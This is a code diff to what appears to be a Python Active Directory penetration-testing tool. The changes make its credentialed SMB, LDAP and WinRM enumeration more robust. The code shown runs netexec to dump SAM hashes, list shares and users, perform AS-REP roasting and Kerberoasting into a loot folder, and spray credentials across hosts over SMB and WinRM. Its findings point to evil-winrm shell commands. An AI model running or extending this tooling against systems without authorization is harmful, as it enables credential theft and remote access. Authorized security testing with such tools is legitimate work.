@@ -474,18 +474,23 @@ async def enum_web(host, port, name, runner, args, findings):
 async def enum_smb(host, runner, args, findings):
     tag = f"{host}/smb"
     nxc = nxc_bin()
-    if nxc and have_creds(args):
-        # authenticated: check access, admin (Pwn3d!), shares, users, and loot
-        auth = nxc_auth(args)
-        for sub, extra in (("--shares", ""), ("--users", ""), ("--pass-pol", ""),
-                           ("--loggedon-users", ""), ("--sam", " (needs admin)")):
-            rc, out = await runner.run(f"{nxc} smb {host} {auth} {sub}",
-                                       f"{tag}/auth_nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
-            scan_findings(out, "smb", 445, findings)
+    if have_creds(args):
+        # authenticated: check access, admin (Pwn3d!), shares, users, and loot.
+        # nxc and smbmap are independent here - a missing nxc should not silently
+        # skip the smbmap-based authenticated check (and vice versa).
+        if nxc:
+            auth = nxc_auth(args)
+            for sub in ("--shares", "--users", "--pass-pol", "--loggedon-users", "--sam"):
+                rc, out = await runner.run(f"{nxc} smb {host} {auth} {sub}",
+                                           f"{tag}/auth_nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
+                scan_findings(out, "smb", 445, findings)
         if TOOLS.get("smbmap"):
             rc, out = await runner.run(f"smbmap -H {host} {smbmap_auth(args)}",
                                        f"{tag}/auth_smbmap.txt", "smbmap-auth")
             scan_findings(out, "smb", 445, findings)
+        if not nxc and not TOOLS.get("smbmap"):
+            findings.append(Finding("MEDIUM", "smb", 445,
+                "Creds supplied but no netexec/nxc or smbmap found - authenticated SMB untested"))
     elif nxc:
         for sub in ("--shares", "--users", "--pass-pol"):
             rc, out = await runner.run(f"{nxc} smb {host} -u '' -p '' {sub}",
@@ -529,8 +534,13 @@ async def enum_ldap(host, port, runner, args, findings):
         nxc = nxc_bin()
         if nxc:
             auth = nxc_auth(args)
-            for sub in ("--users", "--groups", "--asreproast /tmp/asrep.txt",
-                        "--kerberoasting /tmp/kerb.txt"):
+            loot_dir = os.path.join(runner.outdir, host, "ldap", "loot")
+            if not runner.dry_run:
+                os.makedirs(loot_dir, exist_ok=True)
+            asrep_out = os.path.abspath(os.path.join(loot_dir, "asrep.txt"))
+            kerb_out = os.path.abspath(os.path.join(loot_dir, "kerb.txt"))
+            for sub in ("--users", "--groups", f"--asreproast {_sh_quote(asrep_out)}",
+                        f"--kerberoasting {_sh_quote(kerb_out)}"):
                 rc, out = await runner.run(f"{nxc} ldap {host} {auth} {sub}",
                                            f"{tag}/auth_ldap_{sub.split()[0].strip('-')}.txt",
                                            f"{nxc} ldap {sub.split()[0]}")
@@ -754,6 +764,12 @@ async def enum_winrm(host, port, runner, args, findings):
                 pw = "-H <hash>" if getattr(args, "hash", None) else "-p <pass>"
                 findings.append(Finding("CRITICAL", "winrm", port,
                     f"WinRM login works -> SHELL: evil-winrm -i {host} -u {args.user} {pw}"))
+            else:
+                findings.append(Finding("INFO", "winrm", port,
+                    "WinRM open - supplied credential did not confirm a login (see auth_nxc.txt)"))
+        else:
+            findings.append(Finding("MEDIUM", "winrm", port,
+                "WinRM open - creds supplied but netexec/nxc not found, credential untested here"))
         return
     findings.append(Finding("MEDIUM", "winrm", port,
                             "WinRM open - if you get creds, use evil-winrm for a shell"))
@@ -1002,6 +1018,7 @@ async def spray_credential(hosts, runner, args):
     good(f"spraying {C.M}{cred_label(args)}{C.END} across {len(hosts)} host(s) via SMB/WinRM")
     findings = []
     os.makedirs(os.path.join(runner.outdir, "_spray"), exist_ok=True)
+    locked_out = False
     for proto in ("smb", "winrm"):
         rc, out = await runner.run(f"{nxc} {proto} {targets} {auth}",
                                    f"_spray/{proto}.txt", f"spray-{proto}",
@@ -1014,7 +1031,11 @@ async def spray_credential(hosts, runner, args):
                 findings.append(Finding("HIGH", proto, None, f"valid: {line.strip()}"))
             elif "STATUS_ACCOUNT_LOCKED_OUT" in line:
                 findings.append(Finding("HIGH", "creds", None, "LOCKOUT hit - stop now"))
-                bad("account lockout detected - stopping spray"); break
+                bad("account lockout detected - stopping spray")
+                locked_out = True
+                break
+        if locked_out:
+            break
     # report
     print(f"\n{C.BOLD}{'='*70}{C.END}")
     print(f"{C.BOLD}  SPRAY RESULTS  -  {cred_label(args)}{C.END}")
